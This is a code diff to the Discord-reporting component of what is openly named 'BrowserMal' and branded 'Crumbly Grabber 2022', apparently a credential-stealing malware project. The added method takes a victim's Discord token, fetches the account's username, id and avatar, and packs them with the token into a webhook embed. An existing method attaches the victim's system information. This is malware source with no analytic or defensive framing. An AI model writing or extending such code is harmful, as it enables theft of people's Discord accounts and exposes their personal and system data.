@@ -1,4 +1,5 @@
-﻿using System.Collections.Generic;
+﻿using System;
+using System.Collections.Generic;
 using BrowserMal.Discord.Model;
 using BrowserMal.Util;
 
@@ -9,21 +10,55 @@ namespace BrowserMal.Discord
 
         public string CreateMessage(int color, string username, string content ="", string description = "")
         {
-            DiscordMessage discordMessage = new DiscordMessage(username, content);
-
-            Embed embed = new Embed
+            try
             {
-                Color = color,
-                Description = description,
-                Fields = new List<Field>(),
-                Author = new Author("Crumbly"),
-                Footer = new Footer("Crumbly Grabber 2022")
-            };
+                DiscordMessage discordMessage = new DiscordMessage(username, content);
 
-            embed.Fields.Add(new Field("System Info", SystemInfo.Init()));
-            discordMessage.embeds.Add(embed);
+                Embed embed = new Embed
+                {
+                    Color = color,
+                    Description = description,
+                    Fields = new List<Field>(),
+                    Author = new Author("Crumbly"),
+                    Footer = new Footer("Crumbly Grabber 2022")
+                };
 
-            return JsonUtil.GetJson<DiscordMessage>(discordMessage);
+                embed.Fields.Add(new Field("System Info", SystemInfo.Init()));
+                discordMessage.embeds.Add(embed);
+
+                return JsonUtil.GetJson<DiscordMessage>(discordMessage);
+            }
+            catch (Exception ex)
+            {
+                throw ex;
+            }
+            
+        }
+
+        public string CreateMessage(int color, string username, string discordToken)
+        {
+            try
+            {
+                DiscordUser discordUser = DiscordUserManager.GetUserInformation(discordToken);
+                DiscordMessage discordMessage = new DiscordMessage(username);
+
+                Embed embed = new Embed
+                {
+                    Color = color,
+                    Fields = new List<Field>(),
+                    Author = new Author($"{discordUser.username}#{discordUser.discriminator}", $"https://cdn.discordapp.com/avatars/{discordUser.id}/{discordUser.avatar}.png"),
+                    Footer = new Footer("Crumbly Grabber 2022")
+                };
+
+                embed.Fields.Add(new Field("Discord", DiscordUserManager.GenerateUserInformationMessage(discordUser, discordToken)));
+                discordMessage.embeds.Add(embed);
+
+                return JsonUtil.GetJson<DiscordMessage>(discordMessage);
+            }
+            catch (Exception ex)
+            {
+                throw ex;
+            }
         }
 
         public string CreateSimpleMessage(string username, string content)
